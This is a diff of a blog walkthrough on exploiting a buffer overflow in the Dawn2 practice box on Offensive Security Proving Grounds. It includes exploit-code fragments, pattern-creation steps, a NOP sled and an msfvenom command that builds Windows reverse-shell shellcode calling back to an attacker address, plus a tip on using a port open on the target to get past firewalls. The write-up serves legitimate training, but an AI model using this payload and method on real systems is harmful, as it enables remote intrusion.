@@ -1,13 +1,12 @@
 Finally getting around to finishing this writeup. Dawn2 was the most enjoyable box I've done in the short time I've been pwning boxes as well as one that I'm actually allowed to write about (since I'm pretty much just pwning offsec boxes that have strict write up rules and when I finally pwn a real life one at work - pretty sure I can't do a writeup on that either) - and while not a difficult box per se, the way I solved the box was memorable to me and sort of highlights the experience of problem solving. Penetration testing is, at it's core, Problem Solving. And I think this box really espouses that quality. The box has also helped me understand memory corruption exploits a little better.
 
-Shout out to whitecr0wz for authoring this box! and my friend vrvik @ https://github.com/ruthvikvegunta for working with me on this... even though we came at different conclusions, his solution actually helped me further understand my reasonings.
+Shout out to whitecr0wz for authoring this box! and my friend vrvik @ https://github.com/ruthvikvegunta even though we came at different conclusions, his solution actually helped me further understand my reasonings.
 
 I am going to be doing this box on Offensive Security's Proving Grounds so unfortunately no sick banners when you finally get the root flag but because of the plug and play nature of the platform you don't have to do netdiscover or an nmap scan of your environment to find the box so there's that lol.
 
 Let's look at the output of a generic nmap -A type scan. 
 
 (Full disclosure I just run ```autorecon``` for most things cause it automates the boring stuff - but **understand that, without customization, autorecon simply queues the most vanilla of scans for you** and if you don't find anything with automated methods always be prepared to do things "manually")
-
 
 ```
 Host is up, received user-set (0.023s latency).
@@ -108,9 +107,9 @@ def connect():
 connect()
 ```
 
-It's fairly straightforward it's a simple tcp client takes two arguments the target IP and the port of the service and prints out status messages, I like to put things inside of functions cause it keeps things a little neat in my head. Also note that I haven't included a main() function yet and I'm just calling the function connect() directly - If you didn't know Python (unlike other languages) doesn't actually care about entrypoints ilke main() but it's always good practice to do that for readability.. however since this is still the development phase I like to play things loose.
+It's fairly straightforward it's a simple tcp client takes two arguments the target IP and the port of the service and prints out status messages, I like to put things inside of functions cause it keeps things a little neat in my head. Also note that I haven't included a main() function yet and I'm just calling the function connect() directly - If you didn't know Python (unlike other languages) doesn't actually care about entrypoints like main() but it's always good practice to do that for readability.
 
-Since I know that the program is unstable as indicated by the README file. Let's just yeet a payload... 1000 sounds like a a nice round number (even though the actual payload will be 1001 including the NULL byte but shhhh) let's send a unique string of that length via ```msf-pattern_create -l 1000```
+Now since I know that the program is unstable as indicated by the README file. Let's just yeet a payload... 1000 sounds like a a nice round number (even though the actual payload will be 1001 including the NULL byte but shhhh) let's send a unique string of that length via ```msf-pattern_create -l 1000```
 
 ```
       RPORT = int(sys.argv[2])
@@ -239,7 +238,9 @@ Add these two our code as such,
 ![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHTHEJUMPS.png)
 ![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-SEHTOPofThePayload.png)
 
-So now that we know we have effectively hijacked the execution flow into a spot where our shellcode can live and I'm fairly confident with my counting skills though I've added a print statement to measure the size of the buffer as well lol. Now We can launch the server independently and generate our shellcode via ```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.165 LPORT=1985 -f py -v SHELL -b "\x00"``` notice how I'm using the same port as the service... There's a higher chance of recieving a reverseshell back if you use a port that's open on the target system because of things like firewall rules. Now obviously this isn't always the case but it's a more logical way of going about things than randomly using any old port.
+Man look at how tight that is =P
+
+So now that we know we have effectively hijacked the execution flow into a spot where our shellcode can live and I'm fairly confident with my counting skills though I've added a print statement to measure the size of the buffer as well lol. Now We can launch the server independently and generate our shellcode via ```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.165 LPORT=1985 -f py -v SHELL -b "\x00"``` notice how I'm using the same port as the service. There's a higher chance of recieving a reverseshell back if you use a port that's open on the target system because of things like firewall rules. Now obviously this isn't always the case but it's a more logical way of going about things than randomly using any port.
 
 ```
         NOPS = b"\x90" * 20
@@ -257,13 +258,13 @@ So now that we know we have effectively hijacked the execution flow into a spot 
         print (len(buffer)) # Debugging Size
 ```
 
-The "guts" of the exploit should look something like that. Yeah that's a bit much for NOPS but we got the space so why not use it? ;P
+The "guts" of the exploit should look something like that.
 
 And...
 
 ![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-windowspoc.gif)
 
-voila! we have a working proof of concept. 
+Nice! we have a working proof of concept. 
 
 and just for a bit more fun...
 
@@ -290,7 +291,7 @@ Going through the whole cycle of generating a unique string, finding the offset 
 
 ![](https://raw.githubusercontent.com/TrshPnda/trshpnda.github.io/master/images/Dawn2-Vanilla.png)
 
-we have more vanilla bufferoverflow scenario where the R/ESP register is pointing nicely to our shellcode at the time of the crash with plenty of space to play with and right after our EIP address as well.
+we have a regular bufferoverflow scenario where the R/ESP register is pointing nicely to our shellcode at the time of the crash with plenty of space to play with and right after our EIP address as well.
 
 Do a search for a suitable jump or call esp address
 
